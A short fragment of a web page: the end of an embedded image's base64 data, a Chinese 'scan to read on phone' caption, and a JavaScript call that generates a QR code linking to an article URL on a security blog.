nbAPpRSt+zwmsgbzn3A9X/R8AAAD//6WNjEYAAAAGSURBVAMAYecDkqx5nIYAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/baizhuosmart-licence-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 